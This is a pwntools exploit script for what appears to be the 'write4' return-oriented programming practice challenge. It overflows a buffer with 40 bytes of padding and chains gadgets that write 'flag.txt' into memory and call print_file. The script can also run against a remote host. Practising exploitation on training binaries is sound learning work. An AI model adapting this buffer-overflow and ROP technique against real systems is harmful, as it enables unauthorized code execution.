from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *pwnme + 152
continue
'''.format(**locals())

exe = './write4'
elf = context.binary = ELF(exe, checksec=False)
p = start()
pop_r14_r15 = 0x0000000000400690
pos = 0x601100
ret = 0x00000000004004e6
pop_rdi = 0x0000000000400693

# ===== Exploit script here =====
p.sendlineafter(b'> ', flat(
    b'A'*40,
    pop_r14_r15,
    pos,
    b'flag.txt',
    elf.sym['usefulGadgets'],
    pop_rdi,
    pos,
    ret,
    elf.plt['print_file']
))
p.interactive()